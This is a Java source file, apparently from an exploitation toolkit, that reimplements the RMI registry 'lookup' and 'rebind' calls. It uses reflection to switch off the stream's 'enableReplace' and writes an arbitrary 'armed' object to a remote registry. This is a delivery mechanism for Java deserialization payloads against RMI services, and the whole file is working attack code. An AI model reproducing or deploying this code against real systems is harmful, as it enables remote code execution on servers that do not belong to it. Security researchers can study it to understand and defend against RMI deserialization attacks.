package org.example;

import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.transport.StreamRemoteCall;

import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteRef;

/**
 * @author wh1t3P1g
 * @since 2020/5/12
 */
public class Naming {

    /**
     * Disallow anyone from creating one of these
     */
    private Naming() {}

    public static Remote lookup(Registry registry, Object obj)
            throws Exception {
        RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, "ref");
        long interfaceHash = (long) ReflectionHelper.getFieldValue(registry, "interfaceHash");
        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, "operations");
        java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, 2, interfaceHash);
        try {
            try {
                java.io.ObjectOutput out = call.getOutputStream();
                //反射修改enableReplace
                ReflectionHelper.setFieldValue(out, "enableReplace", false);
                out.writeObject(obj); // arm obj
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }
            ref.invoke(call);
            return null;
        } catch (RuntimeException | RemoteException | NotBoundException e) {
            if(e instanceof RemoteException| e instanceof ClassCastException){
                return null;
            }else{
                throw e;
            }
        } catch (java.lang.Exception e) {
            throw new java.rmi.UnexpectedException("undeclared checked exception", e);
        } finally {
            ref.done(call);
        }
    }

    public static void rebind (RegistryImpl_Stub r, String $param_String_1, Remote $param_Remote_2 ) throws Exception
    {
        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(r,"operations");
        long interfaceHash = (long) ReflectionHelper.getFieldValue(r,"interfaceHash");
        StreamRemoteCall call    = ( StreamRemoteCall )r.getRef().newCall( r, operations, 3, interfaceHash );
        ObjectOutput out     = call.getOutputStream();
        ObjectOutputStream oos     = ( ObjectOutputStream )out;
        Field f       = ObjectOutputStream.class.getDeclaredField( "enableReplace" );
        f.setAccessible( true );
        f.set( oos, false );
        out.writeObject( $param_String_1 );
        out.writeObject( $param_Remote_2 );
        r.getRef().invoke( call );
        r.getRef().done( call );
    }
}